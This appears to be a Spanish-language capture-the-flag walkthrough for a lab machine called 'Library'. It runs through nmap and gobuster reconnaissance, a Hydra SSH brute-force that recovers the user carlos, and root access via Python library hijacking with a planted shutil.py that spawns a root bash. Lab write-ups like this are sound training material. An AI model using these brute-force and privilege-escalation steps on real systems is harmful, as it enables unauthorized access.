# Library

![Image](https://github.com/user-attachments/assets/f5e187c3-6f6f-48c9-8a02-224ff9b958d2)

Empezamos con un nmap:

```bash
sudo nmap -p- --open -sS -sV -sC -min-rate 5000 -vvv -Pn -n 172.17.0.2 
```

```bash
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOE+AMUTmmJFie8NgXoV0LWMWmHQU2yXAMVJnPC/JPzRYOstWvVS+YjLNy2mNK2aKFi/ubqYfwGq5IkKZgXTUEA=
|   256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKaYjuffpq2p5LshURmRdGCPjM1gO/+OI5UZ4l37IkRF
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```
Vemos que tenemos el puerto 80 (HTTP) y el 22 (SSH) abierto. Vamos a mirar que hay en el puerto 80.

---

![Image](https://github.com/user-attachments/assets/ee5ce09b-67c5-4049-8b2e-9354c19fa0a1)


Vemos la pagina de apache por defecto, vamos hacer fuzzing y ver que nos podemos encontrar.

Hacemos uso de gobuster:
```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak,html 
```

![Image](https://github.com/user-attachments/assets/91bb619e-8085-4041-bacc-7ba8079dcba4)



Vemos que *index.php* nos da algo interesante (una contraseña):

![Image](https://github.com/user-attachments/assets/f856a2e0-a119-4ff6-85a8-737e9acc86ad)


## Ataque de fuerza | Hydra | Diccionario usuarios

Ponemos el siguiente comando:

```bash
hydra ssh://172.17.0.2 -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD -t 4 
```



Y nos da el resultado:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-22 14:04:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8295455 login tries (l:8295455/p:1), ~2073864 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
[STATUS] 84.00 tries/min, 84 tries in 00:01h, 8295371 to do in 1645:55h, 4 active
[STATUS] 82.67 tries/min, 248 tries in 00:03h, 8295207 to do in 1672:26h, 4 active
```

Listo, ahora sabemos que se llama carlos. Vamos a conectarnos por ssh.

---

nos conectamos con el siguiente comando:


```bash
ssh carlos@172.17.0.2 
```

Y listo, estamos conectados como el usuario carlos, ahora vamos hacer la escalada de privilegios.

---

Verificamos que binarios se pueden ejecutar con permisos de otros usuarios con:

```bash 
sudo -l 
```

```bash
Matching Defaults entries for carlos on 11379fc37632:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 11379fc37632:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Aquí podemos ver que podemos ejecutar con cualquier usuario y sin contraseña el binario **Python3** para el fichero **script.py**.

Vemos en /opt lo que tiene dentro el script.py


```bash
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```


### Python Library Hijacking

Creamos un modulo de python con el mismo nombre de la librería que importa el modulo **script.py**.
de la siguiente manera:

nombre en nano: shutil.py


```bash
import os

os.system("sudo /bin/bash")
```


Dentro del modulo que creamos, ejecutamos una **bash** como el usuario **root**.

Esto lo que hace es que al ejecutarlo lo primero que lee el sistema es en el **shutil.py** pensando que es la librería del *script.py* 

---

Ejecutamos como **root**, el binario **python3** para el modulo **script.py**

```bash
carlos@11379fc37632:/opt$ sudo /usr/bin/python3 /opt/script.py
```

y listo, somos root:

![Image](https://github.com/user-attachments/assets/497029d1-1279-4db4-a8d1-70df9d1bc063)

---
